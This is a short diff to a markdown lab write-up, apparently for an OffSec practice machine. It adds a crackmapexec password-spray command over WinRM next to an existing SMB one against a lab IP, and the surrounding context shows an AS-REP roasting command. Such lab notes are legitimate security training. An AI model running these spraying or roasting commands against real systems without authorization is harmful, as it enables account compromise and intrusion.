@@ -148,6 +148,8 @@ GetNPUsers.py hutch.offsec/ -usersfile users.txt -format hashcat -dc-ip 192.168.
 
 Tried to password spray
 
+- Using the SMB protocol
+
 ```bash
 crackmapexec smb 192.168.214.122 -u users.txt -p users.txt
 ```
@@ -155,6 +157,12 @@ crackmapexec smb 192.168.214.122 -u users.txt -p users.txt
 
 ![](https://i.imgur.com/EVW8zBJ.png)
 
+
+- Using the WINRM protocol
+
+```bash
+crackmapexec winrm 192.168.214.122 -u users.txt -p users.txt
+```
 
 
 ![](https://i.imgur.com/7YGbvds.png)
